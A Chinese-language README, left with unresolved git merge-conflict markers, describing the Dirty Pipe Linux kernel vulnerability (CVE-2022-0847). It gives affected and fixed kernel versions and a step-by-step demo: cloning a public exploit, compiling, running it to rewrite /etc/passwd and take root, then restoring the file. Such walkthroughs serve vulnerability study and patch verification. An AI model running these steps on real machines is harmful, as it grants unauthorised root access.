<<<<<<< HEAD
# 漏洞描述

​	`CVE-2022-0847`是自 `5.8 `以来` Linux `内核中的一个漏洞，攻击者利用该漏洞可以覆盖任意只读文件中的数据。这样将普通的权限提升至`root`权限，因为非特权进程可以将代码注入到根进程。

​	`CVE-2022-0847`类似于` CVE-2016-5195 “Dirty Cow”`（脏牛提权），而且容易被利用，漏洞作者将其命名为`Dirty Pipe`



# 影响范围

**危险等级：**高

**POC/EXP：**已公开

**影响版本：**`linux`内核` 5.8 `及 后续版本

`注：安全版本Linux 内核 >= 5.16.11、Linux 内核 >= 5.15.25、Linux 内核 >= 5.10.102`



# 漏洞利用

目前采用`kali`虚拟机作为演示系统利用

目标系统要求，存在`gcc`即可

- 查看当前系统内核版本

```shell
wzy@wzy:/tmp$ uname -a
Linux wzy 5.16.0-kali1-amd64 #1 SMP PREEMPT Debian 5.16.7-2kali1 (2022-02-10) x86_64 GNU/Linux
```

- 拉取`exp`

```shell
git clone https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit
```

- 利用执行

```shell
./compile.sh	# gcc编译

./exploit	    # 执行exp返回如下error信息
wzy@wzy:/tmp/CVE-2022-0847-DirtyPipe-Exploit$ ./exploit
Backing up /etc/passwd to /tmp/passwd.bak ...
Setting root password to "aaron"...
system() function call seems to have failed :(

su root 
密码: aaron 

登录后极为root权限
```

- 还原`passwd`文件

```
mv /tmp/passwd.bak /etc/passwd
```





# 参考链接

- https://dirtypipe.cm4all.com/
- https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit

=======
# CVE-2022-0847-DirtyPipe-
>>>>>>> d8738e8d957de8866792e5bca4f5aacc865713fc
